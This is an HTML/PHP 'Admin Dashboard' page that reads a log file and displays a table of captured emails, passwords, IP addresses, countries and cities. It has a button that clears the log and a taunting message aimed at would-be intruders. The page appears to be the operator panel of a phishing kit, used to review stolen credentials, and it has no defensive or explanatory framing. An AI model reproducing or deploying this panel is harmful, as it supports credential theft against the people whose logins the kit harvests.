<!DOCTYPE html>
<html>
  <head>
    <title>Admin Dashboard</title>
    <style>
      /* Set the background color for the page */
      body {
        background-color: #f2f2f2;
      }
      
      /* Style the table */
      table {
        width: 100%;
        height: 100%;
        margin: 0;
        background-color: #fff;
        border: 2px solid #ddd;
        border-radius: 10px;
        overflow: hidden;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
      }
      
      /* Style the table headers */
      th {
        background-color:#337357;
        color: white;
        text-align: left;
        padding: 8px;
        vertical-align: top;
      }
      
      /* Style the table data */
      td {
        border-bottom: 1px solid #ddd;
        padding: 8px;
        vertical-align: top;
      }
      
      /* Style the table data for row numbers */
      td:first-child {
        width: 20px;
        text-align: center;
      }
      
      /* Style the table rows */
      tr:nth-child(even) {
        background-color: #f2f2f2;
      }
      
      /* Style the table rows on hover */
      tr:hover {
        background-color: #ddd;
      }
      .btn , .btn2{
    background-color:#337357;
    color: white;
    border-radius: 15px;
    padding: 10px;
    margin-right: 10px;
    cursor: pointer;
    border: none;
    margin-bottom: 5px;
    font-size: 10px;
    
    </style>
  </head>
  <body style="background-color:rgb(46,71,93);">
    <center><h1 Style="color:rgb(221,221,221);font-family:impact (sans-serif);">ADMIN DASHBOARD</h1></center>
    <div class="btns"><a href="delete.html"><button class="btn">Clear Dashboard</button></a>
    <a href="./user/editor.html"><button class="btn2">Image Editor</button></a>
    </div>
    <?php
      // Open the log file for reading
      $log_file = fopen("./user/log.txt", "r");
      
      // Check if the file exists
      if (!$log_file) {
        echo "<p>Try hack SOmething DAWG!! :-)</p>";
      } else {
        // Create an HTML table to display the log data
        echo "<table>";
        echo "<tr><th>#</th><th>Date/Time</th><th>Email</th><th>Password</th><th>IP Address</th><th>Country</th><th>City</th></tr>";
        
        // Initialize row number to 1
        $row_number = 1;
        
        // Loop through each line in the log file
        while (!feof($log_file)) {
          $line = fgets($log_file);
          $fields = explode("=", $line);
          
          // Output each variable and its value as a cell in the table
          if ($fields[0] == "Date") {
            echo "<tr><td>" . $row_number . "</td><td>" . $fields[1] . "</td>";
            $row_number++;
          } elseif ($fields[0] == "Email") {
            echo "<td>" . $fields[1] . "</td>";
          } elseif ($fields[0] == "Password") {
            echo "<td>" . $fields[1] . "</td>";
          } elseif ($fields[0] == "IP Address") {
            echo "<td>" . $fields[1] . "</td>";
          } elseif ($fields[0] == "Country") {
            echo "<td>" . $fields[1] . "</td>";
          } elseif ($fields[0] == "City") {
            echo "<td>" . $fields[1] . "</td></tr>";
          }
        }
        
        echo "</table>";
        
        // Close the log file
        fclose($log_file);
      }
    ?>
  </body>
</html>